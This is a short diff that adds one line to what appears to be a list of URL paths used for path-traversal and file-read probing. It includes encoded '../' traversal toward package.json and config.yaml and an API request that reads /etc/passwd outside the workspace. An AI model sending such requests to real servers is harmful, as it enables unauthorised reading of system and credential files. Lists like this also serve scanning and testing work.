@@ -3,3 +3,4 @@
 /dashboard%2e%2e/data/config.yaml
 /api/fs/read?allowOutsideWorkspace=true&path=/etc/passwd
 /api/v1/repos/search?limit=1
+/signalk/v2/api/resources/routes/..%2F..%2F..%2F..%2Fpackage.json
